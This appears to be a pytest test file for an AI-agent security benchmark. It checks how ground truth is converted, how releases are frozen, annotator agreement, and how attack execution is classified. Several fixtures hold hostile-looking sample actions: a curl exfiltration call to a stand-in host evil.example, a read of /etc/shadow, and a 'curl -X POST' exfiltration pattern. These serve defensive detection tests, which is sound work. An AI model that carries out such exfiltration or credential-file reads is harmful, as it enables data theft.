"""Publication contracts: use real schemas and independent run identities."""
import importlib.util
import json
import sqlite3
from pathlib import Path

import pytest

from compare.tools.base import BoundaryType, FindingRecord
from compare.tools.datasets import FrozenDatasetAdapter, _expected_claims
from compare.tools.evaluator import _finding_matches_claim
from scripts.evaluation import final_verdict_metrics as metrics
from scripts.evaluation import gt_agreement


ROOT = Path(__file__).resolve().parents[2]


def test_all_current_v4_behaviors_survive_adapter():
    paths = (ROOT / "datasets/FuxiBench/ground_truth").glob("*/*.json")
    total = converted = 0
    for path in paths:
        if path.parent.name.startswith("_"):
            continue
        gt = json.loads(path.read_text())
        total += len(gt.get("expected_behaviors") or [])
        converted += len(_expected_claims(gt))
    assert total > 0
    assert converted == total


def test_v4_regex_and_network_boundary_are_preserved():
    gt = {"schema": "mtagentlens.ground_truth.v4", "scenario_id": "x", "label": "attack",
          "expected_behaviors": [{"behavior_id": "egress", "attack_pattern": "DataExfiltration",
          "boundary_type": "NetworkBoundary", "severity": "Critical", "should_alert": True,
          "expected_commands": [{"pattern": r"curl\s+-X\s+POST"}],
          "expected_resources": [{"type": "network", "pattern": r"192\.0\.2\.10:9000"}]}]}
    claims = _expected_claims(gt)
    assert len(claims) == 1
    assert claims[0].boundary_type.value == "NetworkBoundary"
    finding = FindingRecord("t", "FuxiBench", "x", "f", "Critical", "DataExfiltration",
        claims[0].boundary_type, "192.0.2.10:9000", "curl -X POST", None, "", 1.0, None)
    assert _finding_matches_claim(finding, claims[0])


def test_current_package_loads_the_detection_scope():
    cases = FrozenDatasetAdapter(ROOT / "datasets/FuxiBench").load_cases()
    assert len(cases) == 93
    assert sum(1 for case in cases if case.is_attack) == 58


def test_release_freezes_inputs_and_detects_gt_tampering(tmp_path):
    from compare.tools.dataset_release import build_release, validate_release
    scenarios = tmp_path / "source"
    (scenarios / "fixtures/demo").mkdir(parents=True)
    (scenarios / "fixtures/demo/task.py").write_text("print('hello')\n")
    (scenarios / "case.json").write_text(json.dumps({"id": "case", "fixture_dir": "demo",
        "agents": [{"task": "Run python task.py in {{FIXTURE_DIR}}."}]}))
    gt_root = tmp_path / "gt"
    (gt_root / "benign").mkdir(parents=True)
    (gt_root / "benign/case.json").write_text(json.dumps({"schema": "mtagentlens.ground_truth.v4",
        "scenario_id": "case", "label": "benign", "attack_type": "benign", "expected_behaviors": []}))
    release = tmp_path / "release"
    build_release(scenarios, gt_root, release)
    case = FrozenDatasetAdapter(release).load_cases()[0]
    assert case.adapter_case.fixture_dir.is_dir()
    assert "Run python" in case.adapter_case.input_artifacts["prompt_text"].read_text()
    (release / "ground_truth/benign/case.json").write_text("{}")
    with pytest.raises(ValueError, match="(?i)(hash|checksum|modified)"):
        validate_release(release)


def test_conformance_join_uses_unique_run_and_requires_true():
    rows = [{"scenario_id": "s", "run_id": f"r{i}"} for i in range(3)]
    audit = [{**rows[0], "conformant": True}, {**rows[1], "conformant": False},
             {**rows[2], "conformant": None}]
    assert metrics.select_audited_runs(rows, audit, "conformant", True) == rows[:1]


def test_audit_join_rejects_ambiguous_or_duplicate_keys():
    with pytest.raises(ValueError, match="(?i)(run|identity)"):
        metrics.select_audited_runs([{"scenario_id": "s"}], [{"scenario_id": "s", "conformant": True}], "conformant", True)
    row = {"scenario_id": "s", "run_id": "r"}
    with pytest.raises(ValueError, match="(?i)duplicate"):
        metrics.select_audited_runs([row, row], [{**row, "conformant": True}], "conformant", True)


def test_execution_conditional_denominator_is_external_to_monitor():
    rows = [{"scenario_id": "s", "run_id": "r1", "final_decision": "Unsafe", "evidence": 0, "capture_quality_status": "healthy"},
            {"scenario_id": "s", "run_id": "r2", "final_decision": "Safe", "evidence": 9, "capture_quality_status": "healthy"}]
    audit = [{"scenario_id": "s", "run_id": "r1", "execution": "executed"},
             {"scenario_id": "s", "run_id": "r2", "execution": "not_executed"}]
    selected = metrics.select_audited_runs(rows, audit, "execution", "executed")
    assert metrics.summarize(selected, "attack_executed")["actionable_rate"] == 1.0


def test_missing_raw_review_cannot_become_agreement_category(tmp_path):
    sidecar = {"scenario_id": "s", "reviewers": [
        {"name": n, "review": {"label": "attack", "attack_type": "B", "expected_behaviors": []}}
        for n in ("刘周康", "唐浩钺", "刘锦样")]}
    sidecar["reviewers"][1]["review"] = {}
    (tmp_path / "s.json").write_text(json.dumps(sidecar))
    with pytest.raises(ValueError, match="(?i)(incomplete|missing|label)"):
        gt_agreement.agreement_report(tmp_path)


def test_undefined_kappa_is_not_reported_as_perfect():
    assert gt_agreement.fleiss_kappa([["attack"] * 3] * 2) is None


def test_agreement_recomputes_named_pattern_sets_not_stored_scores(tmp_path):
    sidecar = {"scenario_id": "s", "agreement": {"behaviors_semantic_jaccard_median": 1.0},
        "reviewers": [{"name": n, "review": {"label": l, "attack_type": t,
            "expected_behaviors": [{"attack_pattern": p}]}}
        for n, l, t, p in [("刘周康", "attack", "B", "CredentialAccess"),
             ("唐浩钺", "attack", "B", "DataExfiltration"),
             ("刘锦样", "benign", "benign", "Reconnaissance")]]}
    (tmp_path / "s.json").write_text(json.dumps(sidecar))
    report = gt_agreement.agreement_report(tmp_path)
    assert report["pattern_category_jaccard_median"] == 0.0


def test_final_run_decision_controls_frozen_detection(tmp_path):
    spec = importlib.util.spec_from_file_location("frozen_canonical", ROOT / "env/scripts/evaluate_frozen.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    db = tmp_path / "run.db"
    conn = sqlite3.connect(db)
    conn.executescript("CREATE TABLE runs(run_id TEXT, final_decision TEXT, final_severity TEXT);"
        "INSERT INTO runs VALUES('r','Safe','Info');"
        "CREATE TABLE responsibility_alerts(alert_id TEXT, timestamp_ns INTEGER, decision TEXT,"
        "severity TEXT, confidence REAL, title TEXT, summary TEXT, reasoning TEXT, primary_agent_id TEXT, engine_section_json TEXT);"
        "INSERT INTO responsibility_alerts VALUES('old',1,'Unsafe','Critical',1,'x','x','x','a','{}');")
    conn.close()
    assert module._alert_rows(db, True) == []


def test_recovered_raw_annotation_is_complete_and_source_bound():
    sidecar = json.loads((ROOT / "datasets/FuxiBench/ground_truth/_reviewers/data-exfil-direct.json").read_text())
    reviewer = sidecar["reviewers"][1]
    assert reviewer["name"] == "唐浩钺"
    assert len(reviewer["review"]["expected_behaviors"]) == 3
    assert sidecar["recovery_provenance"]["raw_review_sha256"]


def test_marker_summary_flag_alone_does_not_prove_hook_execution(tmp_path):
    from scripts.evaluation.attack_execution_evidence import marker_from_summary
    (tmp_path / "summary.json").write_text(json.dumps({"marker_executed": True, "run_marker": "nonce"}))
    assert not marker_from_summary(tmp_path)
    (tmp_path / "marker.log").write_text("other-nonce\n")
    assert not marker_from_summary(tmp_path)
    (tmp_path / "marker.log").write_text("nonce\n")
    assert marker_from_summary(tmp_path)


def test_pilot_command_executes_release_snapshot_not_live_sources(tmp_path):
    from compare.scripts.run.pilot_observer import release_command
    cmd = release_command(tmp_path / "release", tmp_path / "out", "case", "process", "off")
    assert "--execute-release-child" in cmd
    assert str(tmp_path / "release") in cmd
    assert "mtagentlens-benchmark" not in cmd


def test_metrics_reject_results_from_a_different_release():
    with pytest.raises(ValueError, match="release"):
        metrics.validate_run_artifacts([{"scenario_id": "s", "run_id": "r", "release_id": "old"}],
            {"release_id": "new"})


def test_current_release_prompt_manifest_is_shared_with_blind_annotation(current_release_dataset):
    manifest = json.loads((current_release_dataset / "prompt_inputs/manifest.json").read_text())
    assert manifest["schema"] == "mtagentlens.prompt_inputs.v1"
    assert len(manifest["entries"]) == 93
    assert all(entry["sanitized_no_ground_truth_leak"] for entry in manifest["entries"])
    assert all((current_release_dataset / "prompt_inputs" / entry["bundle_json_path"]).is_file() for entry in manifest["entries"])


def test_nested_release_manifest_name_is_content_bound(tmp_path):
    from compare.tools.dataset_release import _inventory
    nested = tmp_path / "fixture/release.json"
    nested.parent.mkdir()
    nested.write_text("payload")
    assert "fixture/release.json" in _inventory(tmp_path)


def test_release_cannot_escape_fixture_source_with_absolute_input(tmp_path):
    from compare.tools.dataset_release import build_release
    source = tmp_path / "source"
    fixture = source / "fixtures/demo"
    fixture.mkdir(parents=True)
    (fixture / "docs.md").write_text("content")
    (source / "case.json").write_text(json.dumps({"id": "case", "fixture_dir": str(fixture), "agents": []}))
    gt = tmp_path / "gt"
    gt.mkdir()
    (gt / "case.json").write_text(json.dumps({"scenario_id": "case", "label": "benign"}))
    with pytest.raises(ValueError, match="(?i)(fixture|relative)"):
        build_release(source, gt, tmp_path / "out")


def test_legacy_agreement_command_preserves_raw_review_bytes(tmp_path):
    import subprocess
    import sys
    directory = tmp_path / "ground_truth/_reviewers"
    directory.mkdir(parents=True)
    payload = {"scenario_id": "s", "reviewers": [{"name": name, "review": {
        "label": "attack", "attack_type": "B", "expected_behaviors": [{"attack_pattern": "DataExfiltration"}]}}
        for name in ("刘周康", "唐浩钺", "刘锦样")]}
    path = directory / "s.json"
    path.write_text(json.dumps(payload))
    original = path.read_bytes()
    result = subprocess.run([sys.executable, str(ROOT / "scripts/evaluation/normalize_gt_agreement.py"),
        "--dataset", str(tmp_path)], capture_output=True, text=True, check=True)
    assert path.read_bytes() == original
    report = json.loads(result.stdout)
    assert report["label"]["fleiss_kappa"] is None
    assert "behaviors_semantic_jaccard_median" not in report


def _execution_db(tmp_path: Path, actions: list[tuple[str, object]]) -> Path:
    db = tmp_path / "exec.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE actions(action_type TEXT, normalized_args_json TEXT)")
    for action_type, args in actions:
        con.execute(
            "INSERT INTO actions VALUES(?, ?)", (action_type, json.dumps(args))
        )
    con.commit()
    con.close()
    return db


def test_secret_read_is_attack_execution(tmp_path):
    from scripts.evaluation.attack_execution_evidence import analyze

    result = analyze(_execution_db(tmp_path, [("FileRead", "/etc/shadow")]))
    assert result["execution"] == "executed"


def test_network_tool_with_external_egress_is_attack_execution(tmp_path):
    from scripts.evaluation.attack_execution_evidence import analyze

    result = analyze(
        _execution_db(
            tmp_path,
            [
                ("ProcessExec", "curl https://evil.example/collect"),
                ("NetworkSend", [{"Url": {"host": "evil.example"}}]),
            ],
        )
    )
    assert result["execution"] == "executed"


def test_shell_use_alone_is_not_attack_execution(tmp_path):
    from scripts.evaluation.attack_execution_evidence import analyze

    result = analyze(_execution_db(tmp_path, [("ProcessExec", "bash")]))
    assert result["execution"] == "weak_partial"


def test_unrelated_file_read_is_not_execution(tmp_path):
    from scripts.evaluation.attack_execution_evidence import analyze

    result = analyze(_execution_db(tmp_path, [("FileRead", "/tmp/report.md")]))
    assert result["execution"] == "not_executed"


def test_uncertain_runs_are_abstentions_not_tn_or_fn():
    """The RQ evaluator must not count Uncertain as a confident negative."""
    from compare.scripts.eval.standard_evaluation import (
        ScenarioResult,
        build_tool_metrics,
    )

    def row(label: str, decision: str) -> ScenarioResult:
        return ScenarioResult(
            scenario_id=f"{label}-{decision}",
            label=label,
            attack_type="B" if label == "attack" else "benign",
            category="test",
            should_alert=label == "attack",
            has_unsafe=decision == "Unsafe",
            unsafe_count=int(decision == "Unsafe"),
            safe_count=int(decision == "Safe"),
            uncertain_count=int(decision == "Uncertain"),
            total_alerts=1,
            total_claims=0,
            tls_sessions=0,
            pbc_edges=0,
            agent_identities=0,
            subagent_boundaries=0,
            final_decision=decision,
        )

    metrics = build_tool_metrics(
        "mtagentlens",
        "MtAgentLens",
        "runtime-causal-observability",
        [
            row("attack", "Unsafe"),
            row("attack", "Uncertain"),
            row("benign", "Safe"),
            row("benign", "Uncertain"),
        ],
    )

    assert (metrics.cm.tp, metrics.cm.fn, metrics.cm.fp, metrics.cm.tn) == (1, 0, 0, 1)
    assert metrics.abstained == 2


@pytest.mark.parametrize('module_name,function_name',[
    ('scripts.evaluation.attack_execution_evidence','_readable'),
    ('scripts.evaluation.audit_benign_conformance','readable'),
])
def test_unreadable_execution_database_never_attempts_implicit_elevation(tmp_path,monkeypatch,module_name,function_name):
    from importlib import import_module
    _readable=getattr(import_module(module_name),function_name)
    import subprocess
    db=tmp_path/'unreadable.db';db.write_bytes(b'private')
    original=Path.open
    def denied(path,*args,**kwargs):
        if path==db:raise PermissionError('test denial')
        return original(path,*args,**kwargs)
    monkeypatch.setattr(Path,'open',denied)
    monkeypatch.setattr(subprocess,'run',lambda *args,**kwargs:pytest.fail('implicit elevation attempted'))
    assert _readable(db) is None
